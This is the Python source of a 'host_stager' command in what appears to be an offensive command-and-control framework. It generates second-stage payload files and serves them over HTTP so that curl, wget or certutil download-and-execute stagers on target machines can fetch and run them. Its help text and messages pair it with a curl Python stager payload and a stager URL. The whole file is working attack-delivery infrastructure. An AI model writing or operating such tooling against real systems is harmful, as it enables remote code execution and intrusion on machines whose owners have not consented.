#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Host second-stage files for curl/wget/certutil download stagers."""

import argparse
from pathlib import Path

from interfaces.command_system.base_command import BaseCommand
from core.output_handler import print_info, print_success, print_error, print_warning
from lib.c2.stager_host import StagerHost
from lib.c2.download_stagers import build_stager_url


class HostStagerCommand(BaseCommand):
    @property
    def name(self) -> str:
        return "host_stager"

    @property
    def aliases(self) -> list:
        return ["serve_stager"]

    @property
    def description(self) -> str:
        return "Serve stager files over HTTP for download-exec payloads"

    @property
    def usage(self) -> str:
        return "host_stager {start|stop|status|generate} [options]"

    @property
    def help_text(self) -> str:
        return f"""
{self.description}

Usage: {self.usage}

Subcommands:
  start [--port 8000] [--dir output/stagers] [--bind 0.0.0.0]
  stop
  status
  generate [--from-payload] [--name stager.py] [--dir output/stagers]

Examples:
  host_stager generate --from-payload
  host_stager start --port 8000 --dir output/stagers
  host_stager status
  set payload payloads/singles/cmd/unix/curl_python_stager
  set stager_url http://10.0.0.5:8000/stager.py
  run
"""

    def execute(self, args, **kwargs) -> bool:
        parser = argparse.ArgumentParser(prog="host_stager", add_help=False)
        parser.add_argument("action", nargs="?", default="status",
                            choices=["start", "stop", "status", "generate"])
        parser.add_argument("--port", type=int, default=8000)
        parser.add_argument("--dir", dest="directory", default="output/stagers")
        parser.add_argument("--bind", default="0.0.0.0")
        parser.add_argument("--from-payload", action="store_true")
        parser.add_argument("--name", default="stager.py")
        try:
            ns = parser.parse_args(args or ["status"])
        except SystemExit:
            return True

        host = StagerHost.get()
        action = ns.action

        if action == "stop":
            host.stop()
            print_success("Stager HTTP server stopped")
            return True

        if action == "status":
            st = host.status()
            if st["running"]:
                print_success(f"Serving {st['directory']} at {st['url']}")
                for fname in st["files"]:
                    print_info(f"  {st['url']}/{fname}")
            else:
                print_info("Stager HTTP server is not running")
            return True

        directory = Path(ns.directory)
        directory.mkdir(parents=True, exist_ok=True)

        if action == "generate":
            return self._generate_files(host, directory, ns)

        if action == "start":
            try:
                url = host.start(str(directory), host=ns.bind, port=ns.port)
            except Exception as exc:
                print_error(str(exc))
                return False
            print_success(f"Serving {directory} at {url}")
            print_info("Pair with: set payload payloads/singles/cmd/unix/curl_python_stager")
            print_info(f"           set stager_url {url}/stager.py")
            return True

        return False

    def _generate_files(self, host: StagerHost, directory: Path, ns) -> bool:
        content = None
        if ns.from_payload:
            mod = getattr(self.framework, "current_module", None)
            if not mod:
                print_error("No module selected — use a payload module or omit --from-payload")
                return False
            if not hasattr(mod, "generate"):
                print_error("Current module has no generate()")
                return False
            try:
                content = mod.generate()
            except Exception as exc:
                print_error(f"generate() failed: {exc}")
                return False
        else:
            path = "payloads/singles/cmd/multi/python_thin_stager"
            loader = getattr(self.framework, "module_loader", None)
            if not loader:
                print_error("module_loader unavailable")
                return False
            mod = loader.load_module(path, framework=self.framework)
            if not mod:
                print_error(f"Could not load {path}")
                return False
            content = mod.generate()

        if content is None:
            print_error("No stager content generated")
            return False

        if isinstance(content, bytes):
            if content.startswith(b"# compiled:"):
                print_warning("Payload returned compile hint — set compile_exe on python_thin_stager first")
                return False
            dest_name = ns.name if ns.name.endswith((".exe", ".bin")) else "stager.bin"
            out = directory / dest_name
            out.write_bytes(content)
        else:
            text = str(content)
            if text.startswith("# compiled:"):
                print_warning(text)
                return False
            dest_name = ns.name if ns.name else "stager.py"
            out = directory / dest_name
            out.write_text(text, encoding="utf-8")

        print_success(f"Wrote {out}")
        lhost = getattr(getattr(self.framework, "current_module", None), "lhost", None)
        lhost_val = getattr(lhost, "value", lhost) if lhost else "127.0.0.1"
        hint_url = build_stager_url(str(lhost_val or "127.0.0.1"), int(ns.port), f"/{out.name}")
        print_info(f"Suggested: host_stager start --port {ns.port} --dir {directory}")
        print_info(f"           set stager_url {hint_url}")
        return True
